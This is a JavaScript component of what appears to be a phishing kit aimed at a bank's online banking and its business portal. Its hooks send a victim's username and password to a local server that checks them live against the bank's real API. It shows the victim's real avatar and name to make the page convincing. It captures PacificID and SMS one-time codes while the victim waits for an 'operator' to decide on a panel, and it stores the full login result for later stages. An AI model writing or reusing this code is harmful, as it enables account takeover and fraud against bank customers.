// ============================================================
// CONECTOR LAB — valida usuario y clave contra la API real del banco
//
// Se carga ANTES que personas.js y define los hooks de integración:
//   window.PacUserCheck  → POST /api/usuario  (chequeo DWR del usuario)
//   window.PacLoginCheck → POST /api/login     (flujo WebFlow usuario+clave)
//
// Comportamiento:
//   - Credenciales malas → { valid: false, message } → personas.js muestra el error.
//   - Credenciales buenas → { valid: true }  → personas.js avanza a la fase
//     "Registra este dispositivo" del index.
//
// Requiere el servidor local:  node server.cjs  (raíz del proyecto)
// ============================================================
(function () {
  "use strict";

  var lastLoginResult = null;

  function post(url, body) {
    return fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    }).then(function (response) {
      if (!response.ok) {
        throw new Error("HTTP " + response.status);
      }
      return response.json();
    });
  }

  // Chequeo del usuario (paso 1) contra el WebFlow real del banco.
  // Si el usuario existe, el banco devuelve su avatar (/ebanking/imagesAvatar/<id>)
  // y su nombre; los cargamos en la pantalla de clave.
  // Si el validador no está disponible, no bloquea: el veredicto final lo da el login.
  window.PacUserCheck = async function (usuario) {
    try {
      var result = await post("/api/usuario", { usuario: usuario });
      if (result.valid && result.avatarUrl) {
        var img = document.querySelector(".pfl-avatar__image");
        if (img) {
          var placeholder = img.getAttribute("src");
          img.addEventListener("error", function onError() {
            img.removeEventListener("error", onError);
            img.setAttribute("src", placeholder);
          });
          img.setAttribute("src", result.avatarUrl);
        }
      }
      return result;
    } catch (error) {
      return { valid: true, message: null };
    }
  };

  // Validación real de usuario + clave (paso 2).
  // Malo → error en pantalla. Bueno → personas.js continúa a "Registra este dispositivo".
  window.PacLoginCheck = async function (usuario, clave) {
    try {
      var result = await post("/api/login", { usuario: usuario, clave: clave });
      lastLoginResult = result;
      if (!result.valid) {
        return { valid: false, message: result.message || "Usuario o contraseña no válidos." };
      }
      return { valid: true, resultado: result.resultado, nombre: result.nombre };
    } catch (error) {
      return {
        valid: false,
        message: "Servidor validador no disponible desde " + location.origin +
          ". Abre la banca en http://127.0.0.1:8138/ (node server.cjs). " +
          "Si la abres por el puerto 8137 (Python) o como archivo local, la validación no funciona."
      };
    }
  };

  // Código PacifiID: la víctima queda EN CARGA hasta que el operador
  // decida en el panel (Bueno / Malo / SMS). Máx. 4 minutos de espera.
  window.PacCodeCheck = async function (codigo) {
    try {
      var result = await post("/api/codigo", { codigo: codigo, tipo: "pacifiid" });
      if (result.accion === "sms") {
        return { valid: false, accion: "sms" };
      }
      if (!result.valid) {
        return { valid: false, message: result.message || "Código incorrecto. Verifica el código generado en tu app PacificID." };
      }
      return { valid: true, message: "Código verificado." };
    } catch (error) {
      return {
        valid: false,
        message: "No fue posible verificar el código. Reintenta en un momento."
      };
    }
  };

  // Código SMS (dPc_): misma espera de decisión del operador en el panel.
  window.PacSmsCodeCheck = async function (codigo) {
    try {
      var result = await post("/api/codigo", { codigo: codigo, tipo: "sms" });
      if (result.accion === "sms") {
        return { valid: false, message: "El código SMS ya fue solicitado." };
      }
      if (!result.valid) {
        return { valid: false, message: result.message || "Código incorrecto. Verifica el código que te llegó por SMS." };
      }
      return { valid: true, message: "Código verificado." };
    } catch (error) {
      return {
        valid: false,
        message: "No fue posible verificar el código. Reintenta en un momento."
      };
    }
  };

  // Validación real de EMPRESAS (portal /Login de intermatico.com).
  // Malo → error en pantalla. Bueno → el flujo se queda cargando
  // (fase siguiente: panel de empresas).
  window.PacBusinessLoginCheck = async function (usuario, clave) {
    try {
      var result = await post("/api/empresa-login", { usuario: usuario, clave: clave });
      if (!result.valid) {
        return { valid: false, message: result.message || "Usuario o contraseña no válidos." };
      }
      return {
        valid: true,
        message: "Credenciales verificadas.",
        nombreImagen: result.nombreImagen,
        imagenUrl: result.imagenUrl
      };
    } catch (error) {
      return {
        valid: false,
        message: "Servidor validador no disponible desde " + location.origin +
          ". Abre la banca en http://127.0.0.1:8138/ (node server.cjs). " +
          "Si la abres por el puerto 8137 (Python) o como archivo local, la validación no funciona."
      };
    }
  };

  // Resultado completo del último login validado, para las fases siguientes.
  window.PacGetLoginResult = function () {
    return lastLoginResult;
  };
})();
